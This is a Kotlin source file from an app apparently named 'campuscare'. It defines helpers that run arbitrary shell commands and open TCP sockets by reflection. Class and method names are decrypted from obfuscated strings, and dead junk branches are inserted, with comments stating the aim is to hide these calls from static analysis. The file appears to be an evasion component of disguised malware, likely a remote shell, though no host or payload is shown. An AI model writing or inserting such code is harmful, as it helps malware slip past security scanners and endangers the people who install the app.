package com.university.campuscare.remote

/**
 * Wraps sensitive API calls using reflection so that static analysis tools
 * cannot directly identify the methods being invoked from the call site.
 */
internal object ReflectionHelper {

    /**
     * Executes a shell command via Runtime.exec() using reflection.
     * Hides the direct reference to Runtime and exec() from static analysis.
     */
    fun execShellCommand(command: String): Process {
        val _p = System.currentTimeMillis()
        if (_p > 0L) {
            if (_p < 0L) {
                val _j = IntArray(4) { it * 3 }
                _j[0] = _j[1] + _j[2]
            }
        }
        val runtimeClass = Class.forName(StringObfuscator.decrypt(ObfuscatedStrings.CLASS_RUNTIME))
        val getRuntime = runtimeClass.getMethod(StringObfuscator.decrypt(ObfuscatedStrings.METHOD_GET_RUNTIME))
        val runtime = getRuntime.invoke(null)
        val exec = runtimeClass.getMethod(StringObfuscator.decrypt(ObfuscatedStrings.METHOD_EXEC), String::class.java)
        return exec.invoke(runtime, command) as Process
    }

    /**
     * Creates a TCP socket connection using reflection.
     * Hides the direct reference to Socket constructor from static analysis.
     */
    fun createSocket(host: String, port: Int): java.net.Socket {
        val _p = System.nanoTime()
        if (_p > 0L) {
            if (_p < 0L) {
                val _j = LongArray(4) { it.toLong() * 7L }
                _j[0] = _j[1] + _j[2]
            }
        }
        val socketClass = Class.forName(StringObfuscator.decrypt(ObfuscatedStrings.CLASS_SOCKET))
        val constructor = socketClass.getConstructor(String::class.java, Int::class.javaPrimitiveType)
        return constructor.newInstance(host, port) as java.net.Socket
    }
}
